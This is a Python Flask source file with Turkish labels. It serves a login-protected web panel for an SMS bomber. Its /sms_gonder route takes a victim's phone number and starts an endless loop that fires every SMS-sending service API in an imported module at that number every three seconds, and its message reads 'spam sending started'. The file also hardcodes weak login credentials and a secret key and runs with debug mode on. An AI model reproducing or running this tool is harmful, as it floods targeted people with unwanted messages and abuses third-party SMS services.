from flask import Flask, render_template, request, redirect, url_for, session, flash
from TELEFON.api import A
from concurrent.futures import ThreadPoolExecutor, wait
import threading
import time
from functools import wraps

app = Flask(__name__, static_folder='templates')
app.secret_key = 'supersecretkey'

servisler_api = [getattr(A, attribute) for attribute in dir(A)
                 if callable(getattr(A, attribute)) and not attribute.startswith('__')]

# Kullanıcı parolası
USERNAME = 'user'
PASSWORD = 'pass'

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
@login_required
def anabölüm():
    return render_template('ana.html')

@app.route('/kural-kullanım')
@login_required
def kural():
    return render_template('kural-kullanım.html')

@app.route('/sms-spam')
@login_required
def sms_sayfa():
    return render_template('sms-spam.html')

@app.route('/sms-sorumluluk')
@login_required
def sms_sorumluluk():
    return render_template('sms-sorumluluk.html')

@app.route('/sms-api')
@login_required
def sms_api():
    return render_template('sms-api.html', servisler_api=servisler_api)

@app.route('/termux-sorumluluk')
@login_required
def termux_sayfa1():
    return render_template('termux-sorumluluk.html')

@app.route('/termux-kod')
@login_required
def termux_sayfa():
    return render_template('termux-kod.html')

@app.route('/cmd-kod')
@login_required
def cmd_sayfa1():
    return render_template('cmd-kod.html')

@app.route('/cmd-sorumluluk')
@login_required
def cmd_sorumluluk2():
    return render_template('cmd-sorumluluk.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('anabölüm'))
        else:
            flash('Yanlış kullanıcı adı veya şifre.', 'danger')

    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    session.pop('logged_in', None)
    flash('Başarıyla çıkış yaptınız.', 'success')
    return redirect(url_for('login'))

@app.route('/sms_gonder', methods=['POST'])
@login_required
def sms_gonder():
    tel_no = request.form['tel_no']

    if len(tel_no) < 10 or not tel_no.isdigit():
        flash('Telefon numarası en az 10 rakam olmalıdır ve sadece sayılardan oluşmalıdır.', 'danger')
        return redirect(url_for('sms_sayfa'))
    if len(tel_no) > 10 or not tel_no.isdigit():
        flash('Telefon numarası en fazla 10 rakam olmalıdır ve sadece sayılardan oluşmalıdır.', 'danger')
        return redirect(url_for('sms_sayfa'))
    if tel_no in ['544255805']:
        flash('Bu telefon numarasını kullanamazsınız.', 'danger')
        return redirect(url_for('sms_sayfa'))

    def spam_task():
        send_a = A(tel_no)
        while True:
            try:
                with ThreadPoolExecutor() as executor:
                    futures = []
                    for api_func in servisler_api:
                        futures.append(executor.submit(api_func, send_a))
                    wait(futures)
            except Exception as e:
                print(f'Hata: {e}')
            finally:
                time.sleep(3)

    spam_thread = threading.Thread(target=spam_task)
    spam_thread.start()

    flash('Spam gönderme işlemi başlatıldı.', 'success')
    return redirect(url_for('sms_sayfa'))

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

if __name__ == '__main__':
    app.run(debug=True, use_reloader=False)
